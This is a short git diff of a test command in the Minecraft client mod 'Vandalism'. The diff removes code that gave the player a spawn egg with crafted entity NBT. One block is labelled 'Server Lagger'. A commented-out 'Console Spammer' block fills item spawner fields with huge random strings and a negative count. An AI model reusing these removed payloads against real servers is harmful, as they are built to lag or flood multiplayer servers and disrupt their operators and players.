@@ -21,13 +21,7 @@ package de.nekosarekawaii.vandalism.feature.command.impl.misc;
 import com.mojang.brigadier.builder.LiteralArgumentBuilder;
 import de.nekosarekawaii.vandalism.feature.command.AbstractCommand;
 import de.nekosarekawaii.vandalism.util.ChatUtil;
-import de.nekosarekawaii.vandalism.util.game.ItemStackUtil;
 import net.minecraft.command.CommandSource;
-import net.minecraft.component.DataComponentTypes;
-import net.minecraft.component.type.NbtComponent;
-import net.minecraft.item.ItemStack;
-import net.minecraft.item.Items;
-import net.minecraft.nbt.NbtCompound;
 
 public class TestCommand extends AbstractCommand {
 
@@ -39,27 +33,6 @@ public class TestCommand extends AbstractCommand {
     @Override
     public void build(final LiteralArgumentBuilder<CommandSource> builder) {
         builder.executes(context -> {
-            final ItemStack itemStack = new ItemStack(Items.CAT_SPAWN_EGG);
-            final NbtCompound entityData = new NbtCompound();
-
-            // Server Lagger
-            entityData.putString("id", "minecraft:arrow");
-            entityData.putByte("pickup", (byte) 3);
-
-            // Console Spammer
-            /*entityData.putString("id", "minecraft:ominous_item_spawner");
-            entityData.putString("spawn_item_after_ticks", RandomStringUtils.random(10000));
-            final NbtCompound item = new NbtCompound();
-            item.putString("id", RandomStringUtils.random(10000));
-            item.putInt("count", -1);
-            final NbtCompound components = new NbtCompound();
-            components.putString("minecraft:max_stack_size", RandomStringUtils.random(10000));
-            item.put("components", components);
-            entityData.put("item", item);*/
-
-            itemStack.set(DataComponentTypes.ENTITY_DATA, NbtComponent.of(entityData));
-
-            ItemStackUtil.giveItemStack(itemStack);
             ChatUtil.infoChatMessage("Executed Test Command.");
             return SINGLE_SUCCESS;
         });
